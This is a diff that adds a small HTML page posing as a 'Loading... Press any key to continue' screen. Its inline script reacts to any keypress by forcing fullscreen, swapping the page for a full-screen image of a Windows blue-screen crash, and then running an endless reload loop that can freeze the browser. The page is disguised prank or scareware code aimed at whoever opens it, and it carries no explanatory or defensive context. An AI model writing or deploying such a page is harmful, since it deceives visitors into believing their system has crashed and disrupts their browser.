@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Loading...</title>
+</head>
+<body>
+<center>
+<h1>Loading...</h1>
+<p>Press any key to continue . . .</p>
+</center>
+<script>
+function delay(time) { return new Promise(resolve => setTimeout(resolve, time));}document.onkeydown = async function(){const{documentElement:e}=document;e.requestFullscreen?e.requestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen?e.webkitRequestFullscreen():e.msRequestFullscreen&&e.msRequestFullscreen();await delay(3000);document.body.style.padding="0",document.body.style.margin="0",document.body.innerHTML="<img src=\"https://upload.wikimedia.org/wikipedia/commons/5/56/Bsodwindows10.png\" width="+screen.width+" height="+screen.height+"></img>";document.onbeforeunload=function(){localStorage.x=1};setTimeout(function(){for(;;)location.reload(1)},1e3);}
+</script>
+
+</body>
+</html>
